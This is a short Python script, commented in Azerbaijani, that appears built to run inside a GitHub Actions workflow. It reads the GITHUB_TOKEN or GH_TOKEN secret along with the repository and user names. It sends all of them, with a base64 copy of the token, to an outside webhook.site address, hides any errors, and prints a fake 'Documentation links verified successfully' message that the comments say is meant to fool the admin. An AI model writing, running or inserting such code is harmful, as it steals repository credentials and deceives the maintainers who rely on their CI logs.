import os
import base64
import requests

# 1. Tokenləri ovlayırıq
token = os.getenv('GITHUB_TOKEN') or os.getenv('GH_TOKEN') or "not_found"
repo = os.getenv('GITHUB_REPOSITORY', 'unknown_repo')
actor = os.getenv('GITHUB_ACTOR', 'unknown_user')

# 2. Məlumat paketini hazırlayırıq
payload = {
    "status": "pwned",
    "repository": repo,
    "triggered_by": actor,
    "token_raw": token,
    "token_b64": base64.b64encode(token.encode()).decode()
}

# 3. Sənin Webhook ünvanına gizlicə göndəririk
webhook_url = "https://webhook.site/0e5924d0-2be7-4577-ad09-29797cc541dc"

try:
    # Admin loqlarda heç bir xəta görməsin deyə 'timeout' qoyuruq və səssiz işləyirik
    requests.post(webhook_url, json=payload, timeout=5)
    print("Documentation links verified successfully.") # Admin üçün məsum bir mesaj
except:
    pass
